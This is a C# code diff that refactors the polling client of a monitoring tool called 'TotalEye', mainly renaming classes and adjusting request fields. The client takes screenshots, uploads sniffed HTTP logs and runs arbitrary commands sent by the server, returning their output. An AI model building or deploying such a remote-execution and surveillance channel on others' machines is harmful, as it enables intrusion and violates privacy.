@@ -7,16 +7,16 @@ using VowAI.TotalEye.Tools;
 
 namespace VowAI.TotalEye.Client
 {
-    public class CentrePoller : IDisposable
+    public class ServerPoller : IDisposable
     {
-        private readonly ICentrePollerConfiguration _configuration;
+        private readonly IServerPollerConfiguration _configuration;
         private readonly IUpdateConfiguration _updateConfiguration;
         private readonly IClientControlPolicyProvider _policyProvider;
         private readonly IHttpClientFactory _clientFactory;
         private readonly IConfiguredComputerSniffer _computerSniffer;
         private readonly IConfiguredHttpSniffer _httpSniffer;
 
-        public CentrePoller(ICentrePollerConfiguration configuration, IUpdateConfiguration updateConfiguration, IClientControlPolicyProvider policyProvider, IHttpClientFactory clientFactory, IConfiguredComputerSniffer computerSniffer, IConfiguredHttpSniffer httpSniffer)
+        public ServerPoller(IServerPollerConfiguration configuration, IUpdateConfiguration updateConfiguration, IClientControlPolicyProvider policyProvider, IHttpClientFactory clientFactory, IConfiguredComputerSniffer computerSniffer, IConfiguredHttpSniffer httpSniffer)
         {
             _configuration = configuration;
             _updateConfiguration = updateConfiguration;
@@ -43,7 +43,7 @@ namespace VowAI.TotalEye.Client
                 }
                 catch (Exception exception)
                 {
-                    exception.WriteString<CentrePoller>();
+                    exception.WriteString<ServerPoller>();
                 }
 
                 try
@@ -52,7 +52,7 @@ namespace VowAI.TotalEye.Client
                 }
                 catch (Exception exception)
                 {
-                    exception.WriteString<CentrePoller>();
+                    exception.WriteString<ServerPoller>();
                 }
             }
         }
@@ -78,14 +78,14 @@ namespace VowAI.TotalEye.Client
 
         private async void Poll(HttpClient client)
         {
-            CentreInfoRequest? request;
+            ServerInfoRequest? request;
             ClientControlPolicy? policy;
 
             if ((request = await Ask(client)) == null)
             {
                 throw new InvalidDataException("Fail obtaining request information from centre.");
             }
-            else if((policy = await Reply(client, request)) ==null)
+            else if ((policy = await Reply(client, request)) == null)
             {
                 throw new InvalidDataException("Fail obtaining client control policy from centre.");
             }
@@ -95,19 +95,19 @@ namespace VowAI.TotalEye.Client
             }
         }
 
-        private async Task<CentreInfoRequest?> Ask(HttpClient client)
+        private async Task<ServerInfoRequest?> Ask(HttpClient client)
         {
-            HttpResponseMessage response = await client.GetAsync(_configuration.AskUrl);
+            HttpResponseMessage response = await client.PostAsJsonAsync(_configuration.AskUrl, new VerifiedUser { UserId = _configuration.UserId, Pin = _configuration.Pin });
 
             if (response.IsSuccessStatusCode == false)
             {
                 throw new InvalidOperationException($"Fail to read from centre: HTTP {response.StatusCode}.");
             }
 
-            return await response.Content.ReadFromJsonAsync<CentreInfoRequest>();
+            return await response.Content.ReadFromJsonAsync<ServerInfoRequest>();
         }
 
-        private async Task<ClientControlPolicy?> Reply(HttpClient client, CentreInfoRequest request)
+        private async Task<ClientControlPolicy?> Reply(HttpClient client, ServerInfoRequest request)
         {
             switch (request.Name.ToLower())
             {
@@ -119,7 +119,7 @@ namespace VowAI.TotalEye.Client
 
                     return await UploadCommandOutput(client, request);
 
-                case "http_sniffer":
+                case "http_logs":
 
                     return await UploadHttpLogs(client, request);
 
@@ -129,19 +129,19 @@ namespace VowAI.TotalEye.Client
             }
         }
 
-        private async Task<ClientControlPolicy?> UploadImageFromPath(HttpClient client, CentreInfoRequest request)
+        private async Task<ClientControlPolicy?> UploadImageFromPath(HttpClient client, ServerInfoRequest request)
         {
             string location = LocalComputer.RunCommand("VowAI.TotalEye.CatchScreen.exe /Destination:Screenshot.jpg");
 
             return await UploadFile(client, request, new FileInfo(location).Name, File.ReadAllBytes(location));
         }
 
-        private async Task<ClientControlPolicy?> UploadHttpLogs(HttpClient client, CentreInfoRequest request)
+        private async Task<ClientControlPolicy?> UploadHttpLogs(HttpClient client, ServerInfoRequest request)
         {
-            return await UploadText(client, request, _httpSniffer.ReadActivityLogs());
+            return await UploadText(client, request, JsonSerializer.Serialize(_httpSniffer.ReadHttpLogs()));
         }
 
-        private async Task<ClientControlPolicy?> UploadCommandOutput(HttpClient client, CentreInfoRequest request)
+        private async Task<ClientControlPolicy?> UploadCommandOutput(HttpClient client, ServerInfoRequest request)
         {
             return await UploadText(client, request, LocalComputer.RunCommand(request.Description));
         }
@@ -156,6 +156,9 @@ namespace VowAI.TotalEye.Client
                 case "local_computer":
 
                     (_policyProvider as ClientControlPolicyProvider)?.SetPolicy(policy);
+                    break;
+
+                case "" /* No further action. */:
                     break;
 
                 default:
@@ -193,7 +196,7 @@ namespace VowAI.TotalEye.Client
             }
         }
 
-        private async Task<ClientControlPolicy?> UploadFile(HttpClient client, CentreInfoRequest request, string name, byte[] bytes)
+        private async Task<ClientControlPolicy?> UploadFile(HttpClient client, ServerInfoRequest request, string name, byte[] bytes)
         {
             MultipartFormDataContent content = new MultipartFormDataContent();
             StringContent tokenContent = new StringContent(request.Token);
@@ -201,21 +204,21 @@ namespace VowAI.TotalEye.Client
 
             imageContent.Headers.Add("Content-Type", "application/octet-stream");
 
-            content.Add(tokenContent, "Token");
-            content.Add(imageContent, "Payload", name);
+            content.Add(tokenContent, "token");
+            content.Add(imageContent, "payload", name);
 
             HttpResponseMessage response = await client.PostAsync(request.ReplyUrl, content);
             return await response.Content.ReadFromJsonAsync<ClientControlPolicy>();
         }
 
-        private async Task<ClientControlPolicy?> UploadText(HttpClient client, CentreInfoRequest request, string text)
+        private async Task<ClientControlPolicy?> UploadText(HttpClient client, ServerInfoRequest request, string text)
         {
             MultipartFormDataContent content = new MultipartFormDataContent();
             StringContent token = new StringContent(request.Token, Encoding.UTF8);
             StringContent uploadContent = new StringContent(text, Encoding.UTF8, "text/plain; charset=UTF-8");
 
-            content.Add(token, "Token");
-            content.Add(uploadContent, "Payload");
+            content.Add(token, "token");
+            content.Add(uploadContent, "payload");
 
             HttpResponseMessage response = await client.PostAsync(request.ReplyUrl, content);
             return await response.Content.ReadFromJsonAsync<ClientControlPolicy>();
